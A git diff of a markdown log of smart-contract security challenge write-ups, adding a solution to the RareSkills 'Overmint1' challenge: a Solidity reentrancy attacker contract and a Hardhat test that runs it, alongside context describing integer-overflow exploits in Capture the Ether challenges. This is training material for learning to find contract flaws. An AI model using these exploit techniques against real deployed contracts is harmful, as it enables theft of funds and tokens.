@@ -1,4 +1,4 @@
-# Week 2
+# Security - Week 2
 
 ## Capture the Ether (RareSkills Repo) - Token Sale
 
@@ -63,7 +63,7 @@ In other words,  if we call `buy` and specify `numTokens = 115792089237316195423
 
 After calling `buy` in this way, the contract's new balance is 1.415992086870360064 ether, i.e., it didn't even earn the price of a single token (1 ether) but issued an insane amount of tokens to us. We can subsequently call `sell` with `numTokens = 1` to earn 1 ether from the contract, resulting in a contract balance of 0.415992086870360064 ether (< 1 ether), which completes the challenge.
 
-# Week 1
+# Security - Week 1
 
 ## Capture the Ether (RareSkills Repo) - Guess the Secret Number
 
@@ -378,7 +378,6 @@ _Overmint1_ERC1155_Attacker.sol_
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity 0.8.15;
 
-import "hardhat/console.sol";
 import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
 import "./Overmint1-ERC1155.sol";
 
@@ -769,3 +768,122 @@ This challenge is conveniently solved via Remix. To increase the `player`'s toke
 4. Lastly, we can use `transfer` to transfer `value = 998999` (or more) from the second EOA to `player`, leaving `player` with a balance of 1000000 (or more).
 
 Note that the `to` argument in the above call to `transferFrom` can actually be chosen arbitrarily. The important point in the above sequence is not that we increase the `player`'s balance from 1000 to 1001, but that we underflow the balance of our second EOA so that this account has enough tokens to bump up `player`'s balance to 1M or more. 
+
+# NFT Variants and Staking
+
+## RareSkills Riddles - Overmint1
+
+### Contract
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.15;
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+
+contract Overmint1 is ERC721 {
+    using Address for address;
+    mapping(address => uint256) public amountMinted;
+    uint256 public totalSupply;
+
+    constructor() ERC721("Overmint1", "AT") {}
+
+    function mint() external {
+        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
+        totalSupply++;
+        _safeMint(msg.sender, totalSupply);
+        amountMinted[msg.sender]++;
+    }
+
+    function success(address _attacker) external view returns (bool) {
+        return balanceOf(_attacker) == 5;
+    }
+}
+```
+
+### Exploit
+
+The goal of this challenge is to mint 5 tokens in a single transaction.
+
+We can achieve this by performing a reentrancy attack, exploiting the fact that `mint` does not follow the checks-effects-interactions pattern since `_safeMint` calls `onERC721Received` on the receiving contract before updating `amountMinted`.
+
+Here's an example of an attacker contract we can use:
+
+_Overmint1Attacker.sol_
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.15;
+
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import "./Overmint1.sol";
+
+contract Overmint1Attacker is IERC721Receiver {
+    Overmint1 public overmint1;
+
+    constructor(address _overmint1Address) {
+        overmint1 = Overmint1(_overmint1Address);
+    }
+
+    function attack() public {
+        overmint1.mint();
+        for (uint256 i = 1; i < 6; i++) {
+            overmint1.transferFrom(address(this), msg.sender, i);
+        }
+    }
+
+    // This function is called by the Overmint1 contract during _safeMint
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        override
+        returns (bytes4)
+    {
+        // Check the number of tokens minted, and if it's less than 5, mint again
+        if (overmint1.balanceOf(address(this)) < 5) {
+            overmint1.mint();
+        }
+        return this.onERC721Received.selector;
+    }
+}
+```
+
+_Overmint1.js_
+```javascript
+const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
+const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+const NAME = "Overmint1";
+
+describe(NAME, function () {
+    async function setup() {
+        const [owner, attackerWallet] = await ethers.getSigners();
+
+        const VictimFactory = await ethers.getContractFactory(NAME);
+        const victimContract = await VictimFactory.deploy();
+
+        return { victimContract, attackerWallet };
+    }
+
+    describe("exploit", async function () {
+        let victimContract, attackerWallet;
+        before(async function () {
+            ({ victimContract, attackerWallet } = await loadFixture(setup));
+        });
+
+        it("conduct your attack here", async function () {
+            const AttackerFactory = await ethers.getContractFactory("Overmint1Attacker");
+            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
+            await attackerContract.connect(attackerWallet).attack();
+        });
+
+        after(async function () {
+            expect(await victimContract.balanceOf(attackerWallet.address)).to.be.equal(5);
+            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(
+                3,
+                "must exploit in two transactions or less"
+            );
+        });
+    });
+});
+```
